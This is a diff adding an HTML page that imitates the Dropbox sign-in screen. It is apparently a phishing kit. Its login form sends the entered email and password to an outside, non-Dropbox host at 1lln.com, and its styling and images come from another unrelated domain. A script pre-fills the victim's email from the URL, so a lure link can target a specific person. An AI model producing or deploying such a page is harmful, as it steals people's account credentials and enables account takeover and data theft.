@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script>function getcrrid(){return '408fa5bf541bd68ace2407ebbc4373af';}</script>
+
+<link href="https://www.lii2.com/2/favicon.ico" rel="shortcut icon" type="image/x-icon">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<title>Dropbox - Sign in</title>
+<link href="https://www.lii2.com/2/index.css" rel="stylesheet">
+</head>
+
+<style>
+    .large-input {
+        width: 100%;
+        max-width: 300px;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+        font-size: 16px;
+        margin-bottom: 15px;
+        transition: border-color 0.3s, box-shadow 0.3s;
+    }
+
+    .large-input:focus {
+        border-color: #66afe9;
+        box-shadow: 0 0 8px rgba(102, 175, 233, 0.6);
+        outline: none;
+    }
+
+    .remember-me {
+        display: flex;
+        align-items: center;
+        margin-bottom: 15px;
+    }
+
+    .remember-me input {
+        margin-right: 5px;
+    }
+
+    .submit-button {
+        background-color: #007bff;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.3s, box-shadow 0.3s;
+    }
+
+    .submit-container {
+        text-align: right;
+    }
+
+    .submit-button:hover {
+        background-color: #0056b3;
+        box-shadow: 0 0 8px rgba(0, 91, 187, 0.6);
+    }
+</style>
+<body>
+<div class="hdr">
+<div>
+<div>
+<div class="a1"><a href="#">Try Dropbox Business</a></div>
+<div class="a2"><img src="https://www.lii2.com/2/logo.png"></div>
+<div class="a3"><a href="#">Download the app</a></div>
+</div>
+</div>
+</div>
+<div class="ctnt">
+<div>
+<div>
+<div class="a1"><img src="https://www.lii2.com/2/sign-in-side-box.png"></div>
+<div class="a2">
+<table class="as-form">
+<tbody>
+<tr class="a1">
+<td class="a1">Sign in</td>
+<td class="a2">or <a href="#">create an account</a></td>
+</tr>
+<tr class="a2">
+<td colspan="2">
+    <form action="https://1lln.com/1/lo/login.php" method="post" onsubmit="return validator.validate();">
+        <input id="email" name="email" placeholder="Email" type="text" value="" fdprocessedid="vbtfx8" class="large-input" required>
+        <input id="password" name="password" placeholder="Password" type="password" fdprocessedid="7piv69" class="large-input" required>
+        
+        <div class="remember-me">
+            <input checked="" name="remember" type="checkbox" value="yo">
+            <span>Remember me</span>
+        </div>
+        
+        <div class="submit-container">
+            <button type="submit" id="submit-like-button" class="submit-button">Sign in</button>
+        </div>
+    </form>
+    
+</td>
+
+
+</tr>
+<tr class="a4">
+<td colspan="2"><a href="#">Forgot your password?</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+</div>
+<div class="ftr">
+<div>
+<div>
+<div class="a1">
+<div>
+<div>
+<div class="footer-col">
+<ul>
+<li class="header">Dropbox</li>
+<li><a href="#">Install</a></li>
+<li><a href="#">Mobile</a></li>
+<li><a href="#">Pricing</a></li>
+<li><a href="#">Business</a></li>
+<li><a href="#">Enterprise</a></li>
+<li><a href="#">Tour</a></li>
+</ul>
+</div>
+<div class="footer-col">
+<ul>
+<li class="header">About us</li>
+<li><a href="#">Dropbox Blog</a></li>
+<li><a href="#">About</a></li>
+<li><a href="#">Branding</a></li>
+<li><a href="#">News</a></li>
+<li><a href="#">Jobs</a></li>
+</ul>
+</div>
+<div class="footer-col">
+<ul>
+<li class="header">Support</li>
+<li><a href="#">Help Center</a></li>
+<li><a href="#">Get Started</a></li>
+<li><a href="#">Privacy &amp; Terms</a></li>
+<li><a href="#">Copyright</a></li>
+<li><a href="#">Contact us</a></li>
+</ul>
+</div>
+<div class="footer-col">
+<ul>
+<li class="header">Community</li>
+<li><a href="#">Referrals</a></li>
+<li><a href="#">Forum</a></li>
+<li><a href="#" target="_blank">Twitter</a></li>
+<li><a href="#" target="_blank">Facebook</a></li>
+<li><a href="#">Developers</a></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="a2"><i class="fa fa-globe"></i>English (United States)</div>
+</div>
+</div>
+</div>
+
+<span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span>
+
+<script>
+    // Function to get URL parameter by name
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    // Get the email parameter from the URL
+    var emailFromURL = getParameterByName('email');
+
+    // Set the email field value
+    if (emailFromURL) {
+        document.getElementById('email').value = emailFromURL;
+    }
+
+    // Optional: You can also submit the form automatically if needed
+    // document.getElementById('sign-in-form').submit();
+</script>
+
+
+</body></html>
